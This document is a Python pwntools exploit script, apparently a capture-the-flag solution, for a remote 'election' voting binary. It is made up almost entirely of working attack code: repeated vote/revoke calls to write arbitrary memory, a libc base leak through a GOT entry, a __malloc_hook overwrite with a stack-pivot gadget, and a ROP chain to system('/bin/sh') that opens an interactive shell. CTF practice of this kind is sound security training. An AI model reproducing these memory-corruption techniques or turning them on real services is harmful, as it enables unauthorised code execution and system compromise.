#!/usr/bin/env python
import sys, os
from pwn import *

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
elf = ELF('election'); context.word_size = elf.elfclass
with context.local(log_level='ERROR'):
    libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
if not libc: log.warning('Cannot open libc.so.6')

def add(name):
    r.sendlineafter('>> ', '1')
    r.sendlineafter('>> ', name)

def vote(name, show=False, revoke=None):
    r.sendlineafter('>> ', '2')
    r.sendlineafter('(Y/n) ', 'y' if show else 'n')
    r.sendlineafter('>> ', name)
    if revoke != None:
        r.sendafter('>> ', revoke)

def result(name):
    r.sendlineafter('>> ', '3')

def leak():
    r.sendlineafter('>> ', '2')
    r.sendlineafter('(Y/n) ', 'y')
    r.recvuntil('* ')
    r.recvuntil('* ')
    libc_base = r.leak() - libc.sym['__libc_start_main']
    r.sendlineafter('>> ', '')
    return libc_base

def write_data(addr, s):
    for i, c in enumerate(s):
        tmp = ord(c)
        while tmp > 0x7f:
            _ = flat('yes\x00'.ljust(32), addr-0x10+i, '\x70'); vote(name='oshima', revoke=_)
            tmp -= 0x70
        _ = flat('yes\x00'.ljust(32), addr-0x10+i, chr(tmp)); vote(name='oshima', revoke=_)

r = remote(HOST, PORT)

add(flat(0xffffffffff6003f1, 0x602310))

# fake origin list -> 0x602300 -> 0x602400 (Ojima) 
write_data(0x602310, p64(elf.got['__libc_start_main']))
write_data(0x602318, p64(0x602400))
write_data(0x602400, p64(0x400eeb)) # Ojima

# add offset to the fake list
_ = flat('yes\x00'.ljust(32), 0x602018, '\x20'); vote(name='oshima', revoke=_)

libc_base = leak()
log.info('libc_base: {}'.format(hex(libc_base)))
libc.address += libc_base

write_data(libc.sym['__malloc_hook'], p64(libc.address + 0xc96a6)) # add rsp, 0x38
_ = flat('yes\x00'.ljust(32), 0x602010-0x10, '\xfe'); vote(name='oshima', revoke=_)
add(flat(0x400ea3, libc.binsh, libc.sym['system'])) # rop

r.interactive()
